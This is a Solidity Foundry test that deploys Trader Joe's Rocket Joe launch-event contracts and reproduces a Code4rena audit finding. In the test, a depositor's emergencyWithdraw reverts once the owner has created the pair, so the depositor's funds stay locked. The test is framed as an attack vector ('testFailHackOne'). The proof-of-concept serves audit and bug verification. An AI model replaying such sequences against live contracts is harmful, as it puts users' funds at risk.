//SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.0;

import "./utils/Deploy.t.sol";

import {RocketJoeFactory} from "@traderJoe/RocketJoeFactory.sol";
import {RocketJoeToken} from "@traderJoe/RocketJoeToken.sol";
import {RocketJoeStaking, IERC20Upgradeable} from "@traderJoe/RocketJoeStaking.sol";
import {LaunchEvent} from "@traderJoe/LaunchEvent.sol";
import {ERC20Token} from "@traderJoe/mocks/ERC20Token.sol";

contract TraderJoeTest is Deploy {
    ERC20Token public joe;
    ERC20Token public reward;
    RocketJoeFactory public rFactory;
    RocketJoeToken public rJoe;
    RocketJoeStaking public staking;
    LaunchEvent public launchEvent;
    LaunchEvent public proxy;

    address alice = address(0xdeadbeef);
    address user = address(0xbeefdead);
    function setUp() public  override {
        super.setUp();

        vm.startPrank(alice);
        reward = new ERC20Token();
        joe = new ERC20Token();
        rJoe = new RocketJoeToken();
        staking = new RocketJoeStaking();
        launchEvent = new LaunchEvent();
        rFactory = new RocketJoeFactory(
            address(launchEvent),
            address(rJoe),
            address(weth),
            address(alice),
            address(router),
            address(factory)    
        );
    
        staking.initialize(
            IERC20Upgradeable(address(joe)),
            rJoe,
            100 ether,
            1 days //starttime
        );
        reward.mint(address(alice), 100000 ether);
        joe.mint(address(user), 100000 ether);

        reward.approve(address(rFactory), 100000 ether);
        address proxyAddr = rFactory.createRJLaunchEvent(
            address(alice),
            1 days, //starttime
            address(reward),
            1000 ether,
            100 ether,
            1 ether,
            5e17,
            2e17,
            100 ether,
            7 days,
            14 days
        );
        proxy = LaunchEvent(payable(proxyAddr));

        //transfer ownership from alice to staking
        rJoe.transferOwnership(address(staking));
        vm.stopPrank();

        vm.label(address(joe),"joe");
        vm.label(address(rJoe),"rJoe");
        vm.label(address(staking),"staking");
        vm.label(address(launchEvent),"implement");
        vm.label(address(rFactory),"rFactory");
        vm.label(address(reward),"reward");
        vm.label(address(proxy),"proxy");
        vm.label(address(user),"user");
        vm.label(address(alice),"alice");

        vm.warp(1 days);
        vm.deal(user, 1000 ether);
        vm.deal(alice, 1000 ether);
    }
    function testDeploy() override public {
        super.testDeploy();
        require(address(staking.joe()) == address(joe));
        require(address(staking.rJoe()) == address(rJoe));

    }
    ///attack vector:
    /// see the issue: https://github.com/code-423n4/2022-01-trader-joe-findings/issues/199
    /*
    * user -> deposit joe -> staking
         vm.warp(1 days)
    *    user -> claim reward -> rJoe: deposit(0)
    *        user -> depositAvax -> proxy @ phase1
                alice -> allowEmergencywithdarwin -> proxy
                    alice -> createPair -> proxy @phase3
                   user -> emergencyWithdraw() -> revert!
    */
    function testFailHackOne() public {
        vm.startPrank(user);
        joe.approve(address(staking), 100 ether);
        staking.deposit(100 ether);
        vm.warp(block.timestamp + 1 days);
        staking.deposit(0);
        require(rJoe.balanceOf(user) > 0, "no rJoe");
        
        emit log_named_address("proxy", address(proxy));
        emit log_named_uint("phase", uint(proxy.currentPhase()));
        
        proxy.depositAVAX{value: 10 ether}();

        vm.stopPrank();

        vm.startPrank(alice);
        vm.warp(block.timestamp + 2 days);
        emit log_named_uint("phase", uint(proxy.currentPhase()));
        
        proxy.createPair();
        proxy.allowEmergencyWithdraw();
        vm.stopPrank();

        vm.startPrank(user);
        proxy.emergencyWithdraw();
        vm.stopPrank();
        
    }
}